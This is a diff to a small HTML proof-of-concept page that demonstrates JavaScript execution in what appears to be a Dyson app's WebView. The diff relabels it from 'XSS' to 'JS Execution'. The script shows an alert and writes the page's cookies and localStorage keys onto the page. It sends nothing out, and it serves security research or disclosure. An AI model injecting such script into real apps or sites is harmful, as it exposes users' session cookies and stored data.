@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dyson XSS POC</title>
+    <title>Dyson Webview POC</title>
 </head>
 <body>
-    <h1>Dyson WebView XSS Demo</h1>
+    <h1>Dyson WebView JS Execution Demo</h1>
 
     <script>
-        alert('Hello World! XSS in Dyson WebView!');
+        alert('Hello World!');
 
         document.write('<h2>Data Extracted:</h2>');
         document.write('<p><strong>Cookies:</strong> ' + document.cookie + '</p>');
@@ -16,4 +16,5 @@
         document.write('<p><strong>LocalStorage Keys:</strong> ' + Object.keys(localStorage).join(', ') + '</p>');
     </script>
 </body>
+
 </html>
